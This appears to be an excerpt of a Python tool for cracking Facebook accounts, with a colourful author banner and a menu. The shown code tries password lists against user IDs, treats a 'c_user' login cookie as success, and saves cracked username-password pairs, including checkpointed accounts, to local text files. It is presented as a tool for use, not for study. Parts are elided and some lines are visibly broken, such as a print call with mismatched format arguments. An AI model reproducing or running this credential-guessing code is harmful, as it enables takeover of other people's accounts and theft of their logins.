...
logo =                                          """
\033[1;34m     _    _         _       _ _       _     
\033[1;33m   / \  | |__   __| |_   _| | | __ _| |__  
\033[1;34m  / _ \ | '_ \ / _` | | | | | |/ _` | '_ \ 
\033[1;33m / ___ \| |_) | (_| | |_| | | | (_| | | | |
\033[1;31m/_/   \_\_.__/ \__,_|\__,_|_|_|\__,_|_| |_
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           ABDULLAH
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Ishq khan
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Abdullah7266
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.4.3
\033[1;31m\033[1;31m WhatsApp\x1b[1;97m :\033[1;33m     +923189269701
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mabdullah_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mabdullah_CP.txt' % (H, P, str(len(cp))))
...
def sarfraz():
    ...
    print(' [2] Create File [Best-Method Off]')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Abdullah] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Abdullah_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Abdullah-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Abdullah_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            print('\033[1;34m Total Auto file IDs : %s ' % len(self.id))
